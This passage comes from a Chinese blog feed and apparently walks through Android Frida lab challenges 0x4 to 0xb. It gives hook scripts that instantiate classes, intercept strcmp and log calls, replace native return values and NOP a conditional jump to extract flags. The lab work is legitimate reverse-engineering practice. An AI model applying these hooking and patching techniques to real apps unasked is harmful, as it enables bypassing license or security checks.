class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x4.MainActivity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正确Hook onCreate方法</span></span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onCreate</span>(bundle);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&quot;触发get_flag方法...&quot;</span>);</span><br><span class="line">        var checker = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>)</span><br><span class="line">        var check = checker.$<span class="built_in">new</span>();</span><br><span class="line">        console.<span class="built_in">log</span>(check.<span class="built_in">get_flag</span>(<span class="number">1337</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里记住get_flag不是静态方法，需要先<strong>实例化</strong>然后才能调用</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503282033884.png" alt="image-20250327233612795" style="zoom: 50%;" /><h3 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h3><p>同上，直接hook onCreate调flag方法即可</p><h3 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h3><p>需要在传参的时候传入一个实例化的checker，并对其中的变量进行赋值，hook掉onCreate</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x6.MainActivity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 正确Hook onCreate方法</span></span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onCreate</span>(bundle);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&quot;触发get_flag方法...&quot;</span>);</span><br><span class="line">        var checker = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>)</span><br><span class="line">        var check = checker.$<span class="built_in">new</span>();</span><br><span class="line">        check.num1.value=<span class="number">1234</span>;</span><br><span class="line">        check.num2.value=<span class="number">4321</span>;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">get_flag</span>(check);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x7.MainActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    MainActivity.flag.implementation  = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        var check=Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">        var check_instance=check.$<span class="built_in">new</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        check_instance.num1.value=<span class="number">1000</span>;</span><br><span class="line">        check_instance.num2.value=<span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">flag</span>(check_instance);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>要求在checker存在变量的时候，实例化要进行参数的指定，不然会报错</p><h3 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h3><p>一些frida用法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">enumerateExports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x706e3cef88c0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x706e3cef8aa0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_ZN7_JNIEnv17GetStringUTFCharsEP8_jstringPh&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x706e3cef8ae0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;_ZN7_JNIEnv21ReleaseStringUTFCharsEP8_jstringPKc&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">enumerateExports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)[<span class="number">0</span>].address</span><br><span class="line"><span class="string">&quot;0x706e3cef88c0&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8]-&gt; Module.<span class="built_in">getExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>,<span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="string">&quot;0x706e3cef88c0&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>,<span class="string">&quot;Java_com_ad2001_frida0x8_MainActivity_cmpstr</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line"><span class="string">&quot;0x706e3cef88c0&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">getBaseAddress</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line"><span class="string">&quot;0x706e3cef8000&quot;</span></span><br><span class="line">[V2185A::com.ad2001.frida0x8 ]-&gt; Module.<span class="built_in">enumerateImports</span>(<span class="string">&quot;libfrida0x8.so&quot;</span>)</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74e9920&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__cxa_finalize&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9d90&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74e9660&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__cxa_atexit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9d98&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74e5300&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__register_atfork&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9da0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74a7970&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__strlen_chk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9db0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f7475040&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;strcmp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9db8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070fb675140&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/system/lib64/liblog.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__android_log_print&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9dc0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: <span class="string">&quot;0x7070f74906b0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;module&quot;</span>: <span class="string">&quot;/apex/com.android.runtime/lib64/bionic/libc.so&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;__stack_chk_fail&quot;</span>,</span><br><span class="line">        <span class="string">&quot;slot&quot;</span>: <span class="string">&quot;0x706e3cef9dd0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;function&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>因为这个lab使用的native层里的函数，因此按照之前的方式进行hook就会出现问题，因此引入一个api</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Interceptor.<span class="built_in">attach</span>(targetAddress, &#123;</span><br><span class="line">    onEnter: <span class="built_in">function</span> (args) &#123;</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&#x27;Entering &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log arguments if needed</span></span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave: <span class="built_in">function</span> (retval) &#123;</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&#x27;Leaving &#x27;</span> + functionName);</span><br><span class="line">        <span class="comment">// Modify or log return value if needed</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li><code>Interceptor.attach</code>：为指定的函数地址附加一个回调。<code>targetAddress</code> 应该是我们想要 hook 的原生函数的地址。</li><li><code>onEnter</code>：当 被hook的函数 进入时调用该回调。它提供对函数参数 （<code>args）</code> 的访问 。</li><li><code>onLeave</code>：当 被hook的函数 即将退出时调用该回调。它提供对返回值 （<code>retval</code>） 的访问。</li></ul><p>而之前提到的都是能够获得addr的api，因此我们可以考虑hook掉strcmp来获取他的参数，因为在libfrida0x8.so中strcmp的参数有包括flag的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;com.ad2001.frida0x8.MainActivity$1&quot;);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        var strcmp_addr=Module.findExportByName(&quot;libc.so&quot;,&quot;strcmp&quot;);</span></span><br><span class="line"><span class="string">        Interceptor.attach(strcmp_addr, &#123;</span></span><br><span class="line"><span class="string">        onEnter: function (args) &#123;</span></span><br><span class="line"><span class="string">        var string=Memory.readUtf8String(args[0])</span></span><br><span class="line"><span class="string">            if(string==&quot;abcd&quot;)</span></span><br><span class="line"><span class="string">                console.log(Memory.readUtf8String(args[1]));</span></span><br><span class="line"><span class="string">            // Modify or log arguments if needed</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        onLeave: function (retval) &#123;</span></span><br><span class="line"><span class="string">            // Modify or log return value if needed</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    this.onClick(v);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.attach(<span class="number">6861</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>记得在hook之后重新调用onClick（好玩！</p><h3 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function() &#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.ad2001.a0x9.MainActivity$<span class="number">1</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v) &#123;</span></span><br><span class="line"><span class="string">        console.log(&quot;</span>[*] onClick 被调用<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        var check_flag = Module.findExportByName(&quot;</span>liba0x9.so<span class="string">&quot;, &quot;</span>Java_com_ad2001_a0x9_MainActivity_check_1flag<span class="string">&quot;);</span></span><br><span class="line"><span class="string">        Interceptor.attach(check_flag, &#123;</span></span><br><span class="line"><span class="string">            onEnter: function(args) &#123;</span></span><br><span class="line"><span class="string">                console.log(&quot;</span>[*] check_flag 被调用<span class="string">&quot;);</span></span><br><span class="line"><span class="string">            &#125;,</span></span><br><span class="line"><span class="string">            onLeave: function(retval) &#123;</span></span><br><span class="line"><span class="string">                retval.replace(1337); // 修改返回值为 1337</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">        this.onClick(v);</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">7244</span>)</span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)</span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><p>替换返回值即可</p><h3 id="0xa"><a href="#0xa" class="headerlink" title="0xa"></a>0xa</h3><p>这里我选择的是直接hook掉android_log_print函数，因为在get_flag中该函数的参数包含一个flag的指针，如此便可以获得flag的值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0xa.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.onCreate.<span class="built_in">call</span>(<span class="keyword">this</span>, bundle);</span><br><span class="line">        </span><br><span class="line">        var get_flag = <span class="keyword">new</span> <span class="built_in">NativeFunction</span>(</span><br><span class="line">            Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libfrida0xa.so&quot;</span>, <span class="string">&quot;_Z8get_flagii&quot;</span>),</span><br><span class="line">            <span class="string">&#x27;void&#x27;</span>, [<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]</span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">get_flag</span>(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Interceptor.<span class="built_in">attach</span>(Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;liblog.so&quot;</span>, <span class="string">&quot;__android_log_print&quot;</span>), &#123;</span><br><span class="line">        onEnter: <span class="built_in">function</span>(args) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">1</span>]).<span class="built_in">includes</span>(<span class="string">&quot;FLAG&quot;</span>)) &#123;</span><br><span class="line">                console.<span class="built_in">log</span>(<span class="string">&quot;[FLAG] &quot;</span> + Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">3</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="0xb"><a href="#0xb" class="headerlink" title="0xb"></a>0xb</h3><p>这里发现在getflag函数中，其中的逻辑导致无法对函数体进行合理的利用，因此考虑直接对jnz进行一个nop，也或者可以直接hook跳到正确的函数体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    Interceptor.<span class="built_in">attach</span>(Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;liblog.so&quot;</span>, <span class="string">&quot;__android_log_print&quot;</span>), &#123;</span><br><span class="line">        onEnter: <span class="built_in">function</span>(args) &#123;</span><br><span class="line">            var tag = Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (tag.<span class="built_in">includes</span>(<span class="string">&quot;FLAG&quot;</span>)) &#123;</span><br><span class="line">                console.<span class="built_in">log</span>(<span class="string">&quot;[FLAG] &quot;</span> + Memory.<span class="built_in">readUtf8String</span>(args[<span class="number">3</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Java.<span class="built_in">choose</span>(<span class="string">&quot;com.ad2001.frida0xb.MainActivity&quot;</span>, &#123;</span><br><span class="line">        onMatch: <span class="built_in">function</span>(obj) &#123;</span><br><span class="line">            Interceptor.<span class="built_in">attach</span>(Module.<span class="built_in">getExportByName</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>, <span class="string">&quot;Java_com_ad2001_frida0xb_MainActivity_getFlag&quot;</span>), &#123;</span><br><span class="line">                onEnter: <span class="built_in">function</span>(args) &#123;</span><br><span class="line"></span><br><span class="line">                    Memory.<span class="built_in">protect</span>(Module.<span class="built_in">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="built_in">add</span>(<span class="number">0x170ce</span>), <span class="number">4</span>, <span class="string">&#x27;rwx&#x27;</span>);</span><br><span class="line">                    <span class="keyword">new</span> <span class="built_in">X86Writer</span>(Module.<span class="built_in">findBaseAddress</span>(<span class="string">&quot;libfrida0xb.so&quot;</span>).<span class="built_in">add</span>(<span class="number">0x170ce</span>)).<span class="built_in">putNop</span>().<span class="built_in">flush</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            obj.<span class="built_in">getFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样就可以了</p><blockquote><p>PS：最后发现无需hook掉日志输出函数，其实一开始就应该明白的，毕竟机器都root了，怎么还看不了日志（，adb中就有logcat，可恶!!</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Android运行机制&quot;&gt;&lt;a href=&quot;#Android运行机制&quot; class=&quot;headerlink&quot; title=&quot;Android运行机制&quot;&gt;&lt;/a&gt;Android运行机制&lt;/h2&gt;&lt;p&gt;一般而言，在启动一个 App 时，Android 会首先执行 App</summary>
      
    
    
    
    <category term="安卓逆向" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>固件下的hook &amp; patch</title>
    <link href="http://s1nec-1o.github.io/2025/03/03/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E7%9A%84hook-patch/"/>
    <id>http://s1nec-1o.github.io/2025/03/03/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E7%9A%84hook-patch/</id>
    <published>2025-03-03T08:26:16.000Z</published>
    <updated>2025-03-03T08:31:04.581Z</updated>
    
